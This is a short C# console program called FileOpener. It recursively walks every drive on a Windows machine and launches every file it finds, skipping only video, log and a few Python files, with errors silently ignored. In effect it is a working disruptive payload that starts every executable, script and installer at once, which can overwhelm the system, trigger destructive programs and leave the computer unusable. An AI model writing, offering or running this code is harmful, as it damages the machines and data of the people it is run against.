using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;

namespace FileOpener {
	public class Program {
		private static List<string> log = new List<string>();
		public static void Main(string[] args) {
			string[] drives = Environment.GetLogicalDrives().Reverse().ToArray();

			foreach (string dr in drives) {
				System.IO.DriveInfo di = new System.IO.DriveInfo(dr);
				if (!di.IsReady) {
					Console.WriteLine("The drive {0} could not be read", di.Name);
					continue;
				}
				System.IO.DirectoryInfo rootDir = di.RootDirectory;
				WalkDirectoryTree(rootDir);
			}

			Console.WriteLine("Files with restricted access:");
			foreach (string s in log) {
				Console.WriteLine(s);
			}

			Console.WriteLine("Press any key");
			Console.ReadKey();
		}

		static void WalkDirectoryTree(System.IO.DirectoryInfo root) {
			System.IO.FileInfo[] files = null;
			System.IO.DirectoryInfo[] subDirs = null;
			try {
				files = root.GetFiles("*.*");

			} catch (UnauthorizedAccessException e) {
				log.Add(e.Message);
			} catch (System.IO.DirectoryNotFoundException e) {
				Console.WriteLine(e.Message);
			}

			if (files != null) {
				foreach (System.IO.FileInfo fi in files) {
					Console.WriteLine(fi.FullName);
					try {
						if (fi.Extension.Contains("mp4") || fi.Extension.Contains("mov") || fi.Extension.Contains("log") || fi.FullName.EndsWith("py.exe")) {
							continue;
						}
						Process.Start(fi.FullName);
					} catch { }
				}
				subDirs = root.GetDirectories();

				foreach (System.IO.DirectoryInfo dirInfo in subDirs) {
					WalkDirectoryTree(dirInfo);
				}
			}
		}
	}
}
